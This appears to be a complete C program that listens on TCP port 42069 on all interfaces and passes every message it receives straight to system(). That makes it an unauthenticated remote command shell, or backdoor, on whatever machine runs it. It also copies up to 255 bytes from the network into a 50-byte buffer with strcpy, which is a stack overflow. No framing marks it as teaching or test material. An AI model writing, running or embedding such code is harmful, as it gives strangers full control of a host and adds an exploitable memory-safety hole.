#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 42069
#define BUFFER_SIZE 256

void main(){
    // variables
    struct sockaddr_in addr;
    struct sockaddr client;
    int fd, consockfd, n;
    char buffer[BUFFER_SIZE];

    // create socket
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1){
        printf("Error opening socket\n");
        return;
    }

    // setup socket binding settings
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = 0;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_family = AF_INET;

    // bind socket
    if(bind(fd, (struct sockaddr *) & addr, sizeof(struct sockaddr_in) ) == -1){
        printf("Error binding socket\n");
        return;
    }

    printf("Socket bound to port %i\n", PORT);

    listen(fd, 5);

    int clienlen = sizeof(client);
    consockfd = accept(fd, (struct sockaddr *) &client, (socklen_t *) &clienlen);
    
    if(consockfd < 0){
        printf("Error on accept\n");
        return;
    }

    while(1){

        bzero(buffer, BUFFER_SIZE);
        n = read(consockfd, buffer, 255);
        if(n < 0){
            printf("Error reading from socket\n");
            continue;
        }

        printf("Message: %s\n", buffer);
        char command[50];
        strcpy(command, buffer);
        system(command);

        n = write(consockfd, "I got your message", 18);

        if(n < 0){
            printf("Error writing to socket\n");
            continue;
        }
    }




}